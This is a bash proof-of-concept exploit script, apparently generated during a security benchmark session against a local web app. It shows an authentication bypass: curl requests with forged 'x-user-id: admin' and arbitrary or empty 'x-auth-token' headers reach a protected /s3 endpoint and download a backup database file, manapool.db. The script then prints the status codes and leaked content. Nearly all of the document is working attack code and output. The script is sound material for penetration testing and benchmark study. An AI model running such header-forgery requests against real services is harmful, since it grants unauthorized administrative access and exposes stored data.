#!/bin/bash
# POC: Demonstrates authentication bypass via arbitrary x-user-id and x-auth-token custom headers, allowing access to protected S3 resources including admin buckets and database files
# Target: ./repo
# Created: 2025-11-07T16:12:04.163Z
# Session: benchmark-XBEN-084-24-mhp1efma

# Authentication Bypass via Custom Headers POC
# Demonstrates that arbitrary x-user-id and x-auth-token headers bypass authentication

TARGET_URL="http://localhost:3000"
S3_ENDPOINT="/s3"

echo "=== Authentication Bypass via Custom Headers POC ==="
echo "Target: ${TARGET_URL}${S3_ENDPOINT}"
echo ""

# Test 1: Admin access with arbitrary headers
echo "[TEST 1] Admin access with arbitrary custom headers"
echo "Command: curl -s -H 'x-user-id: admin' -H 'x-auth-token: anything' ${TARGET_URL}${S3_ENDPOINT}"
RESPONSE=$(curl -s -H "x-user-id: admin" -H "x-auth-token: anything" "${TARGET_URL}${S3_ENDPOINT}")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: admin" -H "x-auth-token: anything" "${TARGET_URL}${S3_ENDPOINT}")
echo "HTTP Status: $HTTP_CODE"
echo "Response (first 500 chars): ${RESPONSE:0:500}"
echo ""

# Test 2: Database access (protected resource) with admin headers
echo "[TEST 2] Database access with admin headers - accessing manapool.db"
echo "Command: curl -s -H 'x-user-id: admin' -H 'x-auth-token: anything' ${TARGET_URL}${S3_ENDPOINT}/backups/manapool.db"
DB_RESPONSE=$(curl -s -H "x-user-id: admin" -H "x-auth-token: anything" "${TARGET_URL}${S3_ENDPOINT}/backups/manapool.db")
DB_HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: admin" -H "x-auth-token: anything" "${TARGET_URL}${S3_ENDPOINT}/backups/manapool.db")
echo "HTTP Status: $DB_HTTP_CODE"
if [[ $DB_HTTP_CODE == "200" ]]; then
  echo "✓ Database file accessible via HTTP with admin headers"
  echo "Database content (first 200 bytes): ${DB_RESPONSE:0:200}"
else
  echo "Response: ${DB_RESPONSE:0:200}"
fi
echo ""

# Test 3: Empty token bypass
echo "[TEST 3] Empty token bypass - accessing with empty headers"
echo "Command: curl -s -H 'x-user-id: ' -H 'x-auth-token: ' ${TARGET_URL}${S3_ENDPOINT}"
EMPTY_RESPONSE=$(curl -s -H "x-user-id: " -H "x-auth-token: " "${TARGET_URL}${S3_ENDPOINT}")
EMPTY_HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: " -H "x-auth-token: " "${TARGET_URL}${S3_ENDPOINT}")
echo "HTTP Status: $EMPTY_HTTP_CODE"
if [[ $EMPTY_HTTP_CODE == "200" ]]; then
  echo "✓ Empty tokens still grant access - no validation performed"
else
  echo "Response: ${EMPTY_RESPONSE:0:200}"
fi
echo ""

# Test 4: Arbitrary user ID with invalid token
echo "[TEST 4] Arbitrary user ID (1) with invalid token"
echo "Command: curl -s -H 'x-user-id: 1' -H 'x-auth-token: invalid' ${TARGET_URL}${S3_ENDPOINT}"
USER1_RESPONSE=$(curl -s -H "x-user-id: 1" -H "x-auth-token: invalid" "${TARGET_URL}${S3_ENDPOINT}")
USER1_HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: 1" -H "x-auth-token: invalid" "${TARGET_URL}${S3_ENDPOINT}")
echo "HTTP Status: $USER1_HTTP_CODE"
if [[ $USER1_HTTP_CODE == "200" ]]; then
  echo "✓ Any user ID accepted without validation"
else
  echo "Response: ${USER1_RESPONSE:0:200}"
fi
echo ""

# Summary
echo "=== VULNERABILITY CONFIRMED ==="
if [[ $HTTP_CODE == "200" && $DB_HTTP_CODE == "200" && $EMPTY_HTTP_CODE == "200" && $USER1_HTTP_CODE == "200" ]]; then
  echo "✓ Authentication bypass confirmed"
  echo "✓ Arbitrary headers accepted without validation"
  echo "✓ Protected resources accessible with admin headers"
  echo "✓ No token validation performed"
  exit 0
else
  echo "Some tests failed - partial vulnerability"
  exit 1
fi